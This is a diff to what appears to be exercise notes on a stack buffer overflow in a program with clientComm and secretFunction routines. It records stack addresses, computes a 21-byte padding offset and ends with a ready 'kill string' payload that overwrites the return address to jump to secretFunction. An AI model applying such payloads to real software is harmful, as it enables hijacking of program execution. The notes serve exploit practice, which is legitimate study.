@@ -9,3 +9,9 @@ clientComm leave address: 0x00005555555556d8
 return address of the stack frame in clientComm: 0xffffdd08 -> 0x7fffffffdca8
 
 Format of breaking string: (#A's given by difference from address of str in strcpy to rbp)(rbp of secretFunction backwards)
+rbp of secret: 555556de
+
+dccb -> 56523
+dce0 -> 56544
+Diff = 21
+Kill string: AAAAAAAAAAAAAAAAAAAAA\xde\x56\x55\x55
